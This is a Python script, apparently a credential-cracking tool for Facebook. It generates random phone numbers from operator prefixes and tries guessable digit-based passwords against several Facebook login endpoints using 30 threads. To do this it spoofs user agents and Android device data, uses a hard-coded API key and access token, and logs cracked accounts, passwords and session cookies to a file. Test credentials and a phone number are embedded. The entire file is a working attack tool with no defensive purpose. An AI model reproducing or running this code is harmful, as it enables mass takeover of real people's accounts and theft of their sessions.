import re, time,random,os,sys
from concurrent.futures import ThreadPoolExecutor as tdp
try:
    import requests as r
except:
    os.system("pip install requests")
#coded by SIAM AHMED

banner="""\033[1;33mCoded by SIAM AHMED
Facebook:
https://www.facebook.com/profile.php?id=100078824560530
email:
siam.ahmed.cp@outlook
\033[0m
"""
try:
    ugen =open("/sdcard/sua.txt","r").read().splitlines()
except:
    ugen=["Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.7",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; ca-es) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; pl-PL) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; ru-ru) AppleWebKit/522.11.1 (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/125.5.7 (KHTML, like Gecko) Safari/125.12"]


e="100024864368249"

p="941186"
n=0
ok=0
cp=0
def c(u,e,pw):
  global n,cp,ok
  sys.stdout.write("\r\r\033[1;32m %s |CP-%s | OK-%s\033[0m"%(n,cp,ok))
  sys.stdout.flush()
  status=0
  for p in pw:
     
    #print(f"for {e}-{p}")
    s=r.Session()
    ua=random.choice(ugen)
    s.headers.update({'User-Agent':ua})
    rt=s.get(f"https://{u}.facebook.com")
    c1=";".join(k+"="+v for k,v in dict(s.cookies).items())
    #print(s.headers)
    #print(c1)
    #hd1={'user-agent':ua}
    #s.headers.update(hd1)
    #rt=s.get("https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
    rs=rt.text
    #open("/sdcard/e.html","w").write(rs)
    #print(rt)
    d= {
        "m_ts":re.search('name="m_ts" value="(.*?)"', str(rs)).group(1),
            "lsd":re.search('name="lsd" value="(.*?)"', str(rs)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(rs)).group(1),
            #"m_ts":re.search('name="m_ts" value="(.*?)"', str(rs)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(rs)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":e,
            "pass":p,
           "login":"Log In"
          }
    hd={
"authority": f"{u}.facebook.com",
"method": "POST",
"scheme": "https",
"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"accept-encoding": "gzip, deflate, br",
"accept-language": "en-US,en;q=0.9",
"cache-control": "max-age=0",
"referer": f"https://{u}.facebook.com/",
'sec-ch-ua':'"Not_ABrand";v="99","GoogleChrome";v="109","Chromium";v="109"',
"sec-ch-ua-mobile": "?0",
'sec-ch-ua-platform': '"Android"',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'same-origin',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent':ua#'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54'
}

    def sub():
        global cp,ok
        nonlocal status
        try:
                x=s.post(f"https://{u}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=d,headers=hd
              
                ).text
                #https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100
                
                #https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8
                #open("/sdcard/e.html","w").write(x)
                #print(s.cookies)
                dc=dict(s.cookies)
                coki=";".join([k+"="+v for k,v in dc.items()])
                #print(coki)
                
                #print(cv)
                
                #print(s.cookies)
                x=str(s.cookies)
                #print(f"Running {e} {p}")
                if "checkpoint" in x:
                    cp+=1
                    cv=dc["checkpoint"][13:28]
                    print(f"\u001b[1;36mCP\n{e}-{cv} - {p}\u001b[0m")
                    print("User Agent="+ua)
                    #print("\u001b[1;94m"+coki+"\u001b[0m\n\n")
                    open("sp.txt","a").write(f"{e} {cv} {p}\n")
                    status=1
                    
                    
                elif "c_user" in x:
                    ok+=1
                    cv=dc["c_user"]
                    print(f"\u001b[1;32mOk\n{e}-{cv} - {p}\u001b[0m")
                    print("\u001b[1;94m"+coki+"\u001b[0m\n\n")
                    print("User Agent="+ua)
                    open("sp.txt","a").write(f"{e} {cv} {p} -OK\n")
                    status=1
                    
        except Exception as er:
                print(er)
                print("\n"*3)
                time.sleep(15)
                sub()
        
    sub()
    if status==1:
        break
  n+=1


def vm(u,e,pw):
  global n,cp,ok
  sys.stdout.write(f"\r\r\033[1;32m {n} |CP-{cp} | OK-{ok}\033[0m")
  sys.stdout.flush()
  status=0
  for p in pw:
    s=r.Session()
    ua=random.choice(ugen)
    s.headers.update({'User-Agent':ua})
    rt=s.get(f"https://{u}.facebook.com/login/device-based/password/?uid={e}&flow=login_no_pin&refsrc=deprecated&_rdr")
    c1=";".join(k+"="+v for k,v in dict(s.cookies).items())

    rs=rt.text
    open("/sdcard/e.html","w").write(rs)
    #print(rt)
    d={
    "lsd":re.search('name="lsd" value="(.*?)"', str(rs)).group(1),
    
    "jazoest":re.search('name="jazoest" value="(.*?)"',str(rs)).group(1),
    "uid":e,
    "next":f"https://{u}.facebook.com/login/save-device/",
    "flow":"login_no_pin",
    "pass":p
}
    hd={
"authority": f"{u}.facebook.com",
"method": "POST",
"scheme": "https",
"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"accept-encoding": "gzip, deflate, br",
"accept-language": "en-US,en;q=0.9",
"cache-control": "max-age=0",
"referer": f"https://{u}.facebook.com/",
'sec-ch-ua':'"Not_ABrand";v="99","GoogleChrome";v="109","Chromium";v="109"',
"sec-ch-ua-mobile": "?0",
'sec-ch-ua-platform': '"Android"',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'same-origin',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent':ua#'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54'
}

    def sub():
        global cp,ok
        nonlocal status
        try:
                x=s.post(f"https://{u}.facebook.com/login/device-based/validate-password/?shbl=0",headers=hd,data=d).text
                open("/sdcard/e.html","w").write(x)
                dc=dict(s.cookies)
                coki=";".join([k+"="+v for k,v in dc.items()])
                print(coki)
                
                #print(cv)
                
                x=str(s.cookies)
                #print(f"Running {e} {p}")
                if "checkpoint" in x:
                    cp+=1
                    cv=dc["checkpoint"][13:28]
                    print(f"\u001b[1;36mCP\n{e}-{cv} - {p}\u001b[0m")
                    #print("\u001b[1;94m"+coki+"\u001b[0m\n\n")
                    open("sp.txt","a").write(f"{e} {cv} {p}\n")
                    status=1
                    
                    
                elif "c_user" in x:
                    ok+=1
                    cv=dc["c_user"]
                    print(f"\u001b[1;32mOk\n{e}-{cv} - {p}\u001b[0m")
                    print("\u001b[1;94m"+coki+"\u001b[0m\n\n")
                    open("sp.txt","a").write(f"{e} {cv} {p} -OK\n")
                    status=1
                    
        except Exception as er:
                print(er)
                print("\n"*3)
                time.sleep(15)
                sub()
        
    sub()
    if status==1:
        break
  n+=1



nn=0

#api METHOD submit
import subprocess,random

android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
versi_app = str(random.randint(111111111,999999999))
language = "en_GB"
try:
	simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:
	simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
	
ugent = f"Davik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"


import requests,uuid,json
from string import ascii_uppercase
from string import ascii_lowercase
from string import digits
x = requests.get('http://ip-api.com/json').text

q = json.loads(x)
geo=[]
geo.append(q['lat'])
        
geo.append(q['lon'])
geo.append(q['countryCode'])
e="dajim57746@cmeinbox.com"
p="fu3kl1f3123"

def m2(iid,pwx):
    global geo,n,ugent
    try:
        print(f'\033[1;36m AJX - {n}',end="\r")
        for pas in pwx:
            xyz = requests.Session()
            adid = str(uuid.uuid4())
            device_family_id = str(uuid.uuid4())
            machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
            sim = ''.join(random.choice(digits) for _ in range(20))
            fb = xyz.get('https://free.facebook.com').text
            jazoest = re.search('name="jazoest" value="(.*?)"', str(fb)).group(1)
            data = {'adid':adid,'format':'json','device_id':device_family_id,'email':iid,'password':pas,'generate_analytics_claim':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':device_family_id,'sim_serials':sim,'credentials_type':'device_based_login_password','generate_session_cookies':'1','error_detail_type':'button_with_disabled','source':'device_based_login','machine_id':machine_id,'login_latitude':geo[0],'login_longitude':geo[1],'login_location_accuracy_m':'1.0','jazoest':jazoest,'meta_inf_fbmeta':'','advertiser_id':adid,'encrypted_msisdn':'','currently_logged_in_userid':'0','locale':'en_US','client_country_code':geo[2],'method':'auth.login','fb_api_req_friendly_name':'authenticate','fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                #print(data)
            header = {'content-type':'application/x-www-form-urlencoded','x-fb-sim-hni':str(random.randint(2e4,4e4)),'x-fb-connection-type':'unknown','user-agent':ugent,'x-fb-net-hni':	str(random.randint(2e4,4e4)),'content-encoding':	'gzip','x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),'x-fb-connection-quality':	'EXCELLENT',
'x-fb-friendly-name':	'authenticate','accept-encoding':	'gzip, deflate','x-fb-http-engine':	'Liger'}
            pos = xyz.get('https://b-api.facebook.com/method/auth.login',params=data,headers=header).text
            q = json.loads(pos)
            #print(q)
            if 'session_key' in q:
                    print(' \033[1;32m [OK] '+iid+' | '+pas+'\033[0;97m')
                    #open('/sdcard/HOP/ok.txt','a').write(iid+'|'+pas+'\n')
                    ok.append(iid)
                    break
            elif 'www.facebook.com' in q['error_msg']:
                    print(' \033[1;31m [CP] '+iid+' | '+pas+'\033[0;97m')
                    #open('/sdcard/HOP/cp.txt','a').write(iid+'|'+pas+'\n')
                    break
        
            else:continue
        n+=1
        
        
    except Exception as e:
            print(e)
#vm("m",e,[p])
#sys.exit()
#time.sleep(5)
#m2(e,[p])
#sys.exit()
os.system("clear")
nums=["01766733116"]
print(banner)
print(len(ugen))
codes=[300, 301, 302, 303, 304, 305, 306, 307, 308, 309,310, 311, 312, 313, 314, 315, 316, 317, 318,320, 321, 322, 323, 324, 325, 326,330, 331, 332, 333, 334, 335, 336, 337,340, 341, 342, 343, 344, 345, 346, 347, 348, 349 ,355,364]
code=input("Code(0305,0303,0345):")
import string
lim=int(input("Limit:"))
pslen=int(input("Password Length (6-11):"))
m=int(input("Method:\n1.mbasic\n2.x.fb\n3.Validate\n4.Api"))
for i in range(lim):
    x=''.join(random.choice(string.digits) for _ in range(11-len(code)))
    nums.append(code+x)
#print(num)
os.system("clear")
print(banner)
with tdp(max_workers=30) as t:
    for i in nums:
        pws=[i[(11-n):] for n in range(6,pslen+1)]
        if m==1:
            t.submit(c,"mbasic",i,pws)
        elif m==2:
            t.submit(c,"x",i,pws)
        elif m==3:
            t.submit(vm,"x",i,pws)
        elif m==4:
            t.submit(m2,i,pws)